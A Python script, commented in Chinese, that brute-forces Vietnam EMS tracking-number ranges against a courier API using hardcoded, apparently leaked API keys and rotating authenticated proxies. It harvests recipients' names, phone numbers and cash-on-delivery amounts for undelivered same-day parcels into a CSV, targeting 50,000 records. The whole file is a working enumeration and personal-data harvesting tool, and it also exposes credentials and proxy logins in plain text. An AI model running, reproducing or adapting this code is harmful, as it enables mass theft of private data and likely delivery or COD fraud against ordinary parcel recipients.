#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
针对慢网络优化版本 - 减少线程，增加超时，优先扫描密集区
"""
import hashlib, requests, json, time, random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

API_URL = "https://api-dingdong.ems.com.vn/"
PRIVATE_KEY = "34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A"
BASIC_AUTH = "bG90dG5ldDpkbXM="

TODAY = datetime.now().strftime("%d/%m/%Y")
proxies, print_lock = [], threading.Lock()
state = {'found': 0, 'tested': 0, 'orders': [], 'lock': threading.Lock(), 'start_time': time.time()}
proxy_stats = {'success': {}, 'failed': {}, 'lock': threading.Lock()}
TARGET = 50000

# 实时CSV文件
realtime_csv_file = f"fast_orders_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
csv_lock = threading.Lock()

# 减少到最好的代理
PROXIES = [
    "23.27.184.245:5846:uadkcvtn:uo2rzar814ph",
    "45.43.70.140:6427:uadkcvtn:uo2rzar814ph",
    "82.24.233.117:5439:uadkcvtn:uo2rzar814ph",
    "136.0.188.71:6034:uadkcvtn:uo2rzar814ph",
    "161.123.130.168:5839:uadkcvtn:uo2rzar814ph",
]

def load_proxies():
    global proxies
    for p in PROXIES:
        parts = p.split(':')
        if len(parts) == 4:
            ip, port, user, pwd = parts
            proxies.append({'http': f'http://{user}:{pwd}@{ip}:{port}', 'https': f'http://{user}:{pwd}@{ip}:{port}'})
    print(f"✅ 加载 {len(proxies)} 个优选代理\n")

def init_realtime_csv():
    headers = ['运单号', '收件人', '电话', 'COD金额', '运费', '发件日期', '装载日期', '发现时间']
    with open(realtime_csv_file, 'w', encoding='utf-8-sig') as f:
        f.write(','.join(headers) + '\n')
    print(f"📄 实时CSV文件: {realtime_csv_file}")

def save_order_to_csv(order):
    with csv_lock:
        try:
            row = [
                order['tracking'], order.get('ReceiverName', ''), order.get('ReceiverPhone', ''),
                str(order.get('CollectAmount', 0)), str(order.get('FeeShip', 0)),
                order.get('IssueDate', ''), order.get('LoadDate', ''),
                datetime.now().strftime('%H:%M:%S')
            ]
            formatted_row = [f'"{str(item)}"' for item in row]
            with open(realtime_csv_file, 'a', encoding='utf-8-sig') as f:
                f.write(','.join(formatted_row) + '\n')
                f.flush()
        except Exception as e:
            safe_print(f"❌ CSV保存错误: {e}")

def sign(text):
    return hashlib.sha256((text + PRIVATE_KEY).encode()).hexdigest().upper()

def safe_print(msg):
    with print_lock:
        print(msg)

def is_today(date_str):
    if not date_str:
        return False
    date_str = str(date_str)
    today_dd_mm_yyyy = datetime.now().strftime("%d/%m/%Y")
    today_mm_dd_yyyy = datetime.now().strftime("%m/%d/%Y")
    return (today_dd_mm_yyyy in date_str or today_mm_dd_yyyy in date_str)

def call_api_optimized(url, headers, data, max_retries=3):
    """优化的API调用 - 适合慢网络"""
    for attempt in range(max_retries):
        try:
            proxy = random.choice(proxies) if proxies else None
            
            # 增加超时时间，适合慢网络
            response = requests.post(url, headers=headers, data=data, proxies=proxy, timeout=15)
            
            if response.status_code == 200:
                try:
                    data_response = response.json()
                    code = data_response.get('Code', '')
                    
                    if code == '00':
                        return response, data_response
                    elif code in ['98', '429']:
                        time.sleep(0.5)  # 增加等待时间
                        continue
                    else:
                        return response, data_response
                except:
                    return response, None
            else:
                if attempt < max_retries - 1:
                    time.sleep(0.3)
                    continue
                return response, None
                
        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(0.5)
                continue
            return None, None
    
    return None, None

def check_undelivered_order(tracking):
    if state['found'] >= TARGET:
        return None
    
    sig = sign(tracking)
    headers_form = {
        "Authorization": f"Basic {BASIC_AUTH}",
        "APIKey": PRIVATE_KEY,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    try:
        with state['lock']:
            state['tested'] += 1
        
        r1, data1 = call_api_optimized(
            f"{API_URL}api/Delivery/Inquiry",
            headers_form,
            {"ParcelCode": tracking, "Signature": sig}
        )
        
        if r1 and data1 and data1.get('Code') == '00' and data1.get('Value'):
            v = data1['Value']
            
            delivery_date = v.get('DeliveryDate', '')
            is_delivered = bool(delivery_date)
            
            issue_date = v.get('IssueDate', '')
            load_date = v.get('LoadDate', '')
            is_today_order = is_today(issue_date) or is_today(load_date)
            
            if not is_delivered and is_today_order:
                order = {
                    'tracking': tracking,
                    'ReceiverName': v.get('ReceiverName', ''),
                    'ReceiverPhone': v.get('ReceiverPhone', ''),
                    'CollectAmount': v.get('CollectAmount', 0),
                    'FeeShip': v.get('FeeShip', 0),
                    'IssueDate': issue_date,
                    'LoadDate': load_date,
                }
                
                with state['lock']:
                    state['found'] += 1
                    state['orders'].append(order)
                    
                    elapsed = time.time() - state['start_time']
                    speed = state['tested'] / elapsed if elapsed > 0 else 0
                    
                    safe_print(f"✅ [{state['found']}/{TARGET}] {tracking} | "
                              f"👤{order['ReceiverName'][:20]} | "
                              f"📞{order['ReceiverPhone']} | "
                              f"💰{order['CollectAmount']:,}₫ | "
                              f"📅{order['IssueDate'] or order['LoadDate'] or '空'} | "
                              f"⚡{speed:.0f}/s")
                
                save_order_to_csv(order)
                return True
        else:
            return None
            
    except:
        pass
    
    return False

def main():
    print(f"""
╔════════════════════════════════════════════════════════════════════════════╗
║             🚀 慢网络优化版 - 优先扫描密集区                              ║
╚════════════════════════════════════════════════════════════════════════════╝

⚡ 网络优化:
  • 减少线程数 (20个，避免过载)
  • 增加超时时间 (15秒，适应慢网络)
  • 优选代理池 (5个最好的代理)
  • 优先扫描密集区 (直接从有订单的区域开始)

🎯 扫描策略:
  • 跳过空区域，直接扫描密集区
  • 从EF047530000开始 (已知有订单)
  • 从EP492999000开始 (已知有订单)

📄 保存文件: {realtime_csv_file}
""")
    
    load_proxies()
    init_realtime_csv()
    
    # 优先扫描已知有订单的密集区域
    priority_ranges = [
        # 直接从有订单的区域开始
        ('EF', 47530000, 47540000, 1),     # EF密集区
        ('EP', 492999000, 493020000, 1),   # EP密集区
        ('EP', 493005000, 493015000, 1),   # EP另一个密集区
        ('EP', 493540000, 493570000, 5),   # EP扩展区
        ('EF', 47534000, 47536000, 1),     # EF扩展区
    ]
    
    safe_print("🚀 开始优先扫描密集区...")
    start_time = time.time()
    
    # 减少线程数，适应慢网络
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = []
        
        for prefix, start, end, step in priority_ranges:
            for num in range(start, end, step):
                if state['found'] >= TARGET:
                    break
                tracking = f"{prefix}{num:09d}VN"
                futures.append(executor.submit(check_undelivered_order, tracking))
        
        safe_print(f"📋 提交了 {len(futures)} 个优先任务")
        
        for future in as_completed(futures):
            try:
                future.result()
                
                if state['tested'] % 500 == 0:
                    elapsed = time.time() - start_time
                    speed = state['tested'] / elapsed if elapsed > 0 else 0
                    
                    with proxy_stats['lock']:
                        total_success = sum(proxy_stats['success'].values())
                        total_failed = sum(proxy_stats['failed'].values())
                    
                    safe_print(f"\n📊 已扫{state['tested']} | 找到{state['found']} | {speed:.0f}/s | "
                              f"成功率{state['found']/state['tested']*100:.2f}%\n")
            except:
                pass
    
    elapsed = time.time() - start_time
    safe_print(f"""
\n{'='*60}
🎉 扫描完成！
{'='*60}
找到订单: {state['found']} 个
已测试: {state['tested']} 个
成功率: {state['found']/state['tested']*100:.2f}%
耗时: {elapsed:.1f} 秒
速度: {state['tested']/elapsed:.0f} 次/秒

📄 结果文件: {realtime_csv_file}
{'='*60}
""")

if __name__ == "__main__":
    main()